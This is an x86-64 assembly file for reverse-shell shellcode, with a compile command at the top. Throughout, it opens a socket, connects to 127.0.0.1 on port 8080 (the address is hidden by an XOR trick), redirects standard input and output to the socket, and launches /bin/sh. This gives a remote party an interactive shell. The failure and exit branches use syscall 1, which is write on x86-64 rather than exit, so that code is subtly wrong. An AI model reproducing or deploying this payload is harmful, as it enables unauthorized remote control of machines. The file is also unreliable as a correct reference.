; compile : nasm -f elf64 reverser_shellcode_64.asm && ld reverser_shellcode_64.o -o reverseshell
global      _start

_start:
    mov         al, 0x29
    push        0x2
    pop         rdi
    push        0x1
    pop         rsi
    xor         edx, edx
    syscall
    mov         r9, rax

    xchg        rdi, rax
    xor         rcx, rcx
    mov         ebx, 0xfeffff80
    xor         ebx, 0xffffffff
    push        rcx
    push        rcx
    push        rbx
    push        word 0x901F
    push        word 0x2
    mov         rsi, rsp
    push        byte 0x10
    pop         rdx

    mov         rbx, rdi
    mov         al, 0x2a
    syscall

    inc         eax
    cmp         eax, 1
    jne         fail
    jmp         continue

fail:
    xor         rbx, rbx
    xor         rax, rax
    mov         al, 0x1
    syscall

continue:
    push        byte 0x02
    pop         rsi
    mov         rdi, r9

loop:
    push        0x21
    pop         rax
    syscall
    dec         rsi
    jns         loop

    xor         rdx, rdx
    push        rdx
    push        rdx
    mov         rbx, 0x68732f6e69622f2f
    push        rbx
    mov         rdi, rsp
    push        rdx
    push        rdi
    mov         rsi, rsp
    
    mov         al, 0x3b
    syscall

    xor         rbx, rbx
    xor         rax, rax
    mov         al, 0x1
    syscall